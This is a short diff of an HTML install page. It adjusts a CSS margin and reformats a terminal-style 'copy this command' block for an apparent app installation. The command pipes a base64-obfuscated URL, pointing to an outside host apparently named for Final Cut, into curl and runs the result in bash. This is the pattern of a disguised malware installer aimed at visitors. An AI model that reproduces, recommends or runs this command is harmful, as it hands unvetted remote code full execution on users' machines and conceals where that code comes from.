@@ -202,7 +202,7 @@ After installation, the app is ready to launch.</p>
 /* Terminal Styles */
 .terminal-container {
     max-width: 640px;
-    margin: 10px auto;
+    margin: 10px 0;
     background-color: #ffffff;
     border: 1px solid #e5e7eb;
     border-radius: 8px;
@@ -337,8 +337,7 @@ After installation, the app is ready to launch.</p>
     <div class="terminal-body">
         <div class="terminal-content">
             <div class="terminal-command-wrapper">
-                <code id="commandToCopy" class="terminal-command terminal-font">/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9sZWVncmFlbWUuY29tL2ZpbmFsY3V0 | base64 -d))"
-</code>
+                <code id="commandToCopy" class="terminal-command terminal-font">/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9sZWVncmFlbWUuY29tL2ZpbmFsY3V0 | base64 -d))"</code>
             </div>
             <button
                 onclick="copyCommand()"
